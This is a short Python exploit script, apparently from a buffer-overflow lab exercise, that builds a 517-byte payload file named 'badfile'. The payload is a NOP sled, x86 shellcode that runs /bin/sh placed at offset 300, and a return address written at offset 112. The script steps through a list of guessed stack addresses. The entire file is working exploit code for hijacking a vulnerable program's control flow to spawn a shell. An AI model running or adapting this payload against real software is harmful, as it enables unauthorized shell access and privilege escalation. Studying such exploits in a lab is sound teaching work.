#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Test different return addresses
test_addresses = [
    0xffffcb00,
    0xffffcb10, 
    0xffffcb20,
    0xffffcb30,
    0xffffcb40,
    0xffffcb50,
    0xffffcb60,
    0xffffcb70
]

for addr in test_addresses:
    content = bytearray(0x90 for i in range(517))
    
    # Place shellcode at position 300
    start = 300
    content[start:start + len(shellcode)] = shellcode
    
    # Use the test address
    ret = addr
    offset = 112
    L = 4
    content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
    
    # Write to badfile
    with open('badfile', 'wb') as f:
        f.write(content)
    
    print(f"Testing address: 0x{addr:08x}")
    # You'll manually test each one
    break  # Remove this to generate all addresses